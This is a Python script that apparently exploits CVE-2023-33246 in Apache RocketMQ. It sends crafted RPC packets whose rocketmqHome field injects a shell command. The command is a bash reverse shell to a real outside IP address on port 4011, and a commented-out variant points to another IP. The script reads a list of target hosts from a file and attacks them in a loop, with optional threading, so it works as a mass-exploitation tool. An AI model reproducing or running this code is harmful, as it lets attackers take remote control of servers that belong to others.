import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import socket
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'

def send_data(ip, port, payload):
    # Create a socket object
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the server at the specified IP and port
        s.connect((ip, port))

        # print('send_data')
        # Send the payload
        s.sendall(payload)
        resp = s.recv(1024)
        # print(resp)
        # Close the socket
        s.close()
    except Exception as e:
        pass


def exploit(ip_, index):
    print(index,ip_)
    # command = 'bash -i >& /dev/tcp/39.101.76.53/3334 0>&1'
    command = 'bash -i >& /dev/tcp/13.231.45.178/4011 0>&1'

    res=ip_.split('//')[-1].split(':')
    ip=res[0]
    port = '' if len(res) == 1 else int(res[1])
    hex_payload_prefix = '000000cd000000607b22636f6465223a32352c22666c6167223a302c226c616e6775616765223a224a415641222c226f7061717565223a302c2273657269616c697a655479706543757272656e74525043223a224a534f4e222c2276657273696f6e223a3339357d66696c7465725365727665724e756d733d310a726f636b65746d71486f6d653d2d632024407c7368202e206563686f20'    
    hex_payload_suffix = '3b0a'
    payload = bytes.fromhex(hex_payload_prefix) + command.encode() + bytes.fromhex(hex_payload_suffix)
    hex_payload_length = hex(len(payload) - 4)[2:]
    payload = payload.hex().replace('000000cd000000','000000' + hex_payload_length + '000000')
    payload = bytes.fromhex(payload)
    send_data(ip, port, payload)
    # with result_path.open('a+') as file:
        # file.write(ip_+line_break)


# url=''
# exploit(url,1)


threads = []
# with open(r'D:\Downloads\tmp\.txt', 'r') as file:
with open(r'D:\C#\VSCODE\python\POC_EXP\代码执行_命令执行\RocketMQ\result\CVE-2023-33246.txt','r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 103
        end = start+20

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            time.sleep(3)
            exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 30
# print(urls)

test = 'tm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()